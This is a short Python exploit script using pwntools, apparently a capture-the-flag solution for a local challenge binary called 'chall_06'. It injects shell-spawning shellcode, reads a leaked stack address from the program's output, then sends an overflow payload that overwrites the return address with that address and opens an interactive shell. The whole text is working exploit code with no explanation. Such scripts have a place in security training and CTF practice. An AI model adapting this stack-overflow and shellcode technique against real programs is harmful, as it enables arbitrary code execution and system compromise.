from pwn import *
p=process("./chall_06")
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
payload = b"" + shellcode
p.sendline(payload)
string = p.recvline()
import re
leak = re.findall(b"(0x[0-9a-f]{4,16})",string)[0]
leak = int(leak,16)
payload = b"A" * (0x60 - 0x8) + p64(leak)
p.sendline(payload)
p.interactive()
